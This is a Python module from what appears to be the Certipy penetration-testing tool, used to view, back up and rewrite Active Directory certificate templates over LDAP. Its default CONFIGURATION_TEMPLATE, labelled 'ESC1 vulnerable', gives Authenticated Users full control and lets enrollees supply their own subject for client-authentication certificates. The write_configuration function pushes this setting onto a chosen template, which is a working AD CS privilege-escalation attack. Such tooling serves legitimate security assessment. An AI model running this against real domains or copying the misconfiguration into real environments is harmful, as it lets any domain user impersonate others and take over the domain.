"""
Certificate Template Management Module.

This module implements the functionality to view and modify Active Directory
certificate templates, allowing security assessment and exploitation of
misconfigured templates in AD CS environments.
"""

import argparse
import collections
import json
from itertools import groupby
from typing import Any, Dict, Optional

import ldap3
from ldap3.core.results import RESULT_INSUFFICIENT_ACCESS_RIGHTS
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars

from certipy.lib.constants import (
    OID_TO_STR_NAME_MAP,
    CertificateNameFlag,
    EnrollmentFlag,
    PrivateKeyFlag,
    TemplateFlags,
)
from certipy.lib.files import try_to_save_file
from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.logger import logging
from certipy.lib.security import create_authenticated_users_sd
from certipy.lib.target import Target
from certipy.lib.time import (
    SECONDS_PER_WEEK,
    SECONDS_PER_YEAR,
    filetime_to_span,
    span_to_filetime,
)

# Attributes that should not be modified to avoid breaking template functionality
PROTECTED_ATTRIBUTES = [
    "objectClass",
    "cn",
    "distinguishedName",
    "whenCreated",
    "whenChanged",
    "name",
    "objectGUID",
    "objectCategory",
    "dSCorePropagationData",
    "msPKI-Cert-Template-OID",
    "uSNCreated",
    "uSNChanged",
    "displayName",
    "instanceType",
    "revision",
    "msPKI-Template-Schema-Version",
    "msPKI-Template-Minor-Revision",
]

# ESC1 vulnerable template configuration with full control for 'Authenticated Users'
# This configuration creates a template that allows any authenticated user to enroll
# and obtain certificates with client authentication EKU
CONFIGURATION_TEMPLATE = {
    "showInAdvancedViewOnly": True,
    # Security descriptor giving Authenticated Users full control
    "nTSecurityDescriptor": create_authenticated_users_sd().getData(),
    "flags": int(
        TemplateFlags.PUBLISH_TO_DS
        | TemplateFlags.EXPORTABLE_KEY
        | TemplateFlags.AUTO_ENROLLMENT
        | TemplateFlags.ADD_TEMPLATE_NAME
        | TemplateFlags.IS_DEFAULT
    ),  # Template flags
    "pKIDefaultKeySpec": 2,  # AT_SIGNATURE
    "pKIKeyUsage": b"\x86\x00",  # Digital Signature, Key Encipherment
    "pKIMaxIssuingDepth": -1,  # Maximum depth value for the Basic Constraint extension (-1 means no limit)
    "pKICriticalExtensions": [
        "2.5.29.19",  # Basic Constraints
        "2.5.29.15",  # Key Usage
    ],  # Critical extensions
    "pKIExpirationPeriod": span_to_filetime(SECONDS_PER_YEAR),  # 1 year validity
    "pKIOverlapPeriod": span_to_filetime(SECONDS_PER_WEEK * 6),  # 6 week overlap
    "pKIExtendedKeyUsage": [
        OID_TO_STR_NAME_MAP["client authentication"],
    ],
    "msPKI-Certificate-Application-Policy": [
        OID_TO_STR_NAME_MAP["client authentication"],
    ],
    "pKIDefaultCSPs": [
        "2,Microsoft Base Cryptographic Provider v1.0",
        "1,Microsoft Enhanced Cryptographic Provider v1.0",
    ],
    "msPKI-RA-Signature": 0,  # No recovery agent signatures required
    "msPKI-Enrollment-Flag": int(EnrollmentFlag.NONE),  # No special enrollment flags
    "msPKI-Private-Key-Flag": int(PrivateKeyFlag.EXPORTABLE_KEY),  # Allow export
    "msPKI-Certificate-Name-Flag": int(
        CertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT
    ),  # Name flags
    "msPKI-Minimal-Key-Size": 2048,  # Minimum 2048-bit key
}

TRANSFORMERS = {
    "pKIOverlapPeriod": (filetime_to_span, span_to_filetime),
    "pKIExpirationPeriod": (filetime_to_span, span_to_filetime),
}


def default_into_transformer(value: Any) -> Any:
    """
    Default transformer function that returns the value unchanged.

    Args:
        value: The value to transform

    Returns:
        The original value
    """
    if isinstance(value, list):
        return [default_into_transformer(item) for item in value]
    if isinstance(value, bytes):
        return "HEX:" + value.hex()
    return value


def default_from_transformer(value: Any) -> Any:
    """
    Default transformer function that converts a value to its original form.

    Args:
        value: The value to transform

    Returns:
        The original value
    """
    if isinstance(value, list):
        return [default_from_transformer(item) for item in value]
    if isinstance(value, str) and value.startswith("HEX:"):
        return bytes.fromhex(value[4:])
    return value


class Template:
    """
    Certificate Template management class for viewing and modifying AD CS templates.

    This class provides functionality to retrieve, save, and modify certificate
    template configurations in Active Directory Certificate Services.
    """

    def __init__(
        self,
        target: "Target",
        template: str = "",
        write_configuration: Optional[str] = None,
        write_default_configuration: bool = False,
        save_configuration: Optional[str] = None,
        no_save: bool = False,
        force: bool = False,
        connection: Optional[LDAPConnection] = None,
        **kwargs,  # type: ignore
    ):
        """
        Initialize a Template object for certificate template operations.

        Args:
            target: Target domain information
            template: Name of the certificate template to operate on
            write_configuration: Path to configuration file to apply
            write_default_configuration: Whether to apply the default configuration
            save_configuration: Path to save the current configuration
            no_save: Whether to skip saving the current configuration
            force: Do not prompt for confirmation before applying changes
            scheme: LDAP connection scheme (ldap or ldaps)
            connection: Optional existing LDAP connection to reuse
            **kwargs: Additional keyword arguments
        """
        self.target = target
        self.template_name = template
        self.write_configuration_file = write_configuration
        self.write_default_configuration = write_default_configuration
        self.save_configuration_file = save_configuration
        self.no_save = no_save
        self.force = force
        self.kwargs = kwargs

        self._connection = connection

    @property
    def connection(self) -> LDAPConnection:
        """
        Lazily establish and return an LDAP connection.

        Returns:
            An active LDAP connection to the target domain
        """
        if self._connection is not None:
            return self._connection

        self._connection = LDAPConnection(self.target)
        self._connection.connect()

        return self._connection

    def configuration_to_json(self, configuration: Dict[str, Any]) -> str:
        """
        Convert a template configuration to a JSON string.

        Converts binary attribute values to their hexadecimal representation
        for storage in JSON format.

        Args:
            configuration: Template configuration dictionary

        Returns:
            JSON string representation of the configuration
        """
        output = {}
        for key, value in configuration.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            into_transformer, _ = TRANSFORMERS.get(
                key, (default_into_transformer, None)
            )

            output[key] = into_transformer(value)

        return json.dumps(output, indent=2, ensure_ascii=False)

    def get_configuration(self, template_name: str) -> Optional[LDAPEntry]:
        """
        Retrieve the configuration for a certificate template from AD.

        Searches for the template by CN or displayName and returns its configuration.

        Args:
            template_name: Name of the certificate template to find

        Returns:
            LDAPEntry containing the template configuration or None if not found
        """
        escaped_template = escape_filter_chars(template_name)

        # First try searching by CN
        results = self.connection.search(
            search_filter=f"(&(cn={escaped_template})(objectClass=pKICertificateTemplate))",
            search_base=self.connection.configuration_path,
            query_sd=True,
        )

        # If not found by CN, try displayName
        if not results:
            results = self.connection.search(
                f"(&(displayName={escaped_template})(objectClass=pKICertificateTemplate))",
                search_base=self.connection.configuration_path,
                query_sd=True,
            )

            if not results:
                logging.error(
                    f"Could not find any certificate template for {template_name!r}"
                )
                return None

        if len(results) > 1:
            # This should never happen, but just in case
            logging.error(
                f"Found multiple certificate templates identified by {template_name!r}"
            )
            return None

        return results[0]

    def json_to_configuration(
        self, configuration_json: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Convert a JSON configuration back to a usable LDAP configuration.

        Converts hexadecimal strings back to binary data for LDAP operations.

        Args:
            configuration_json: Dictionary loaded from JSON

        Returns:
            Configuration dictionary with binary values ready for LDAP
        """
        output = {}
        for key, value in configuration_json.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            _, from_transformer = TRANSFORMERS.get(
                key, (None, default_from_transformer)
            )
            output[key] = from_transformer(value)

        return output

    def load_configuration(self, configuration_path: str) -> Dict[str, Any]:
        """
        Load a template configuration from a JSON file.

        Args:
            configuration_path: Path to the configuration JSON file

        Returns:
            Configuration dictionary with binary values

        Raises:
            ValueError: If the JSON file doesn't contain a dictionary
            FileNotFoundError: If the configuration file can't be found
        """
        try:
            with open(configuration_path, "r") as f:
                configuration_json = json.load(f)

            if not isinstance(configuration_json, dict):
                raise ValueError(
                    f"Expected a JSON object, got {type(configuration_json)!r}"
                )

            return self.json_to_configuration(configuration_json)
        except FileNotFoundError:
            logging.error(f"Configuration file not found: {configuration_path}")
            raise
        except json.JSONDecodeError:
            logging.error(f"Invalid JSON in configuration file: {configuration_path}")
            raise ValueError("Invalid JSON in configuration file")
        except Exception as e:
            logging.error(f"Error loading configuration file: {e}")
            raise

    def save_configuration(self, configuration: Optional[LDAPEntry] = None) -> None:
        """
        Save the current configuration to a JSON file.
        """
        # Get the current configuration
        current_configuration = configuration
        if current_configuration is None:
            current_configuration = self.get_configuration(self.template_name)
            if not current_configuration:
                raise Exception(
                    f"Failed to retrieve configuration for {self.template_name!r}. Aborting."
                )

        current_configuration_json = self.configuration_to_json(
            current_configuration["attributes"]
        )

        out_file = (
            self.save_configuration_file.removesuffix(".json")
            if self.save_configuration_file
            else current_configuration.get("cn")
        )

        out_file = f"{out_file}.json"
        logging.info(f"Saving current configuration to {out_file!r}")
        out_file = try_to_save_file(
            current_configuration_json, out_file, abort_on_fail=True
        )
        logging.info(
            f"Wrote current configuration for {self.template_name!r} to {out_file!r}"
        )

    def write_configuration(self) -> bool:
        """
        Apply a new configuration to a certificate template.

        If no configuration file is provided, applies the default vulnerable
        configuration. If save_old is True, saves the current configuration
        before applying changes.

        Returns:
            True if the template was successfully updated, False otherwise
        """
        if not self.template_name:
            logging.error("A template (-template) is required")
            return False

        # Get the configuration to apply
        if self.write_configuration_file:
            try:
                new_configuration = self.load_configuration(
                    self.write_configuration_file
                )
            except (FileNotFoundError, ValueError):
                return False
        else:
            # Use the default vulnerable configuration
            new_configuration = CONFIGURATION_TEMPLATE

        # Get the current configuration
        old_configuration = self.get_configuration(self.template_name)
        if not old_configuration:
            return False

        # Save the old configuration if requested
        if not self.no_save:
            self.save_configuration(old_configuration)

        # Compute the changes to make
        changes = self._compute_changes(old_configuration, new_configuration)

        if not changes:
            logging.warning(
                "New configuration is the same as old configuration. Not updating"
            )
            return False

        # Apply the changes
        return self._apply_changes(old_configuration, changes)

    def _compute_changes(
        self, old_configuration: LDAPEntry, new_configuration: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Compute the changes needed to update a template configuration.

        Args:
            old_configuration: Current template configuration
            new_configuration: New template configuration to apply

        Returns:
            Dictionary of changes to apply using LDAP modify operation
        """
        changes = {}

        # Check for attributes to delete or modify
        for key in old_configuration["attributes"].keys():
            if key in PROTECTED_ATTRIBUTES:
                continue

            # Delete attributes not in the new configuration
            if key not in new_configuration:
                changes[key] = [(ldap3.MODIFY_DELETE, [])]
                continue

            # Replace attributes with new values if different
            old_value = old_configuration.get(key)
            new_value = new_configuration[key]

            if type(old_value) != type(new_value):
                changes[key] = [(ldap3.MODIFY_REPLACE, new_value)]
                continue
            if isinstance(old_value, list):
                # Check if the list values are different
                if collections.Counter(old_value) != collections.Counter(new_value):
                    changes[key] = [(ldap3.MODIFY_REPLACE, new_value)]
                continue

            if old_value != new_value:
                changes[key] = [(ldap3.MODIFY_REPLACE, new_value)]

        # Add new attributes not in the old configuration
        for key, value in new_configuration.items():
            if (
                key in changes
                or key in PROTECTED_ATTRIBUTES
                or key in old_configuration["attributes"]
            ):
                continue

            changes[key] = [(ldap3.MODIFY_ADD, value)]

        return changes

    def _apply_changes(
        self, old_configuration: LDAPEntry, changes: Dict[str, Any]
    ) -> bool:
        """
        Apply computed changes to a template configuration.

        Args:
            old_configuration: Current template configuration
            changes: Dictionary of changes to apply

        Returns:
            True if changes were applied successfully, False otherwise
        """
        template_name = old_configuration.get("cn")
        logging.info(f"Updating certificate template {template_name!r}")

        # Log the changes grouped by operation type
        self._log_changes(changes)

        if not self.force:
            # Ask for confirmation before applying changes
            confirm = input(
                f"Are you sure you want to apply these changes to {template_name!r}? (y/N): "
            )
            if confirm.strip().lower() != "y":
                logging.info("Aborting changes")
                return False

        # Apply the changes
        result = self.connection.modify(
            old_configuration.get("distinguishedName"),
            changes,
            controls=security_descriptor_control(sdflags=0x4),
        )

        if result["result"] == 0:
            logging.info(f"Successfully updated {template_name!r}")
            return True
        elif result["result"] == RESULT_INSUFFICIENT_ACCESS_RIGHTS:
            logging.error(
                f"User {self.target.username!r} doesn't have permission to update "
                f"these attributes on {template_name!r}"
            )
        else:
            logging.error(f"Got error: {result['message']}")

        return False

    def _log_changes(self, changes: Dict[str, Any]) -> None:
        """
        Log the changes to be applied, grouped by operation type.

        Args:
            changes: Dictionary of changes to apply
        """
        # Group changes by operation (MODIFY_DELETE, MODIFY_REPLACE, MODIFY_ADD)
        by_op = lambda item: item[1][0][0]

        for op, group in groupby(sorted(changes.items(), key=by_op), by_op):
            op_name = {
                ldap3.MODIFY_ADD: "Adding",
                ldap3.MODIFY_DELETE: "Deleting",
                ldap3.MODIFY_REPLACE: "Replacing",
            }.get(op, op)

            logging.info(f"{op_name}:")

            for item in list(group):
                key = item[0]
                value = item[1][0][1]
                logging.info(f"    {key}: {value!r}")


def entry(options: argparse.Namespace) -> None:
    """
    Entry point for the template command.

    Args:
        options: Command-line arguments
    """
    target = Target.from_options(options, dc_as_target=True)

    # Remove target from options to avoid duplicate argument
    options.__delattr__("target")

    template = Template(target=target, **vars(options))

    will_write = (
        template.write_default_configuration or template.write_configuration_file
    )

    if template.save_configuration_file:
        template.save_configuration()

    if will_write:
        template.write_configuration()

    # if template.write_default_configuration or template.configuration:
    #     # Apply the configuration
    #     if not template.set_configuration():
    #         logging.error("Failed to set the template configuration")
    #         return
    # _ = template.set_configuration()
